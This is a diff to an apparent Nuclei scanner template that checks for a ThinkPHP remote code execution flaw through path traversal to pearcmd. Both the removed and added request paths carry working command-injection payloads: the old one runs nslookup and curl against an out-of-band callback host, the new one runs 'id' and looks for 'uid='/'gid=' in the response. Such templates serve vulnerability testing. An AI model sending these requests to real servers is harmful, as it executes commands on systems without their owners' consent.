@@ -1,23 +1,21 @@
 id: thinkphp-rce
 
 info:
-  name: ThinkPHP RCE
-  author: shelled
-  severity: high
-  description: ThinkPHP <6.0.14 RCE 
-  reference:
-    - https://twitter.com/cyberkendra/status/1601178498806472705
-    - https://twitter.com/TodayCyberNews/status/1601209967872442370
-  tags: cmdi,oast,dast,blind,rce
-
-requests:
+  name: think php rce
+  author: reewardius
+  severity: critical
+  tags: rce,generic
+  
+http:
   - method: GET
     path:
-      - "{{BaseURL}}/index.php?s=index/index/index/think_lang/../../extend/pearcmd/pearcmd/index&cmd=nslookup {{interactsh-url}}|curl {{interactsh-url}}"
-
+      - "{{BaseURL}}/index/index/index/think_lang/../../extend/pearcmd/pearcmd/index&cmd=id"
+      
     stop-at-first-match: true
     matchers:
       - type: word
-        part: interactsh_protocol
+        part: body
         words:
-          - "dns"
+          - "uid="
+          - "gid="
+        condition: and
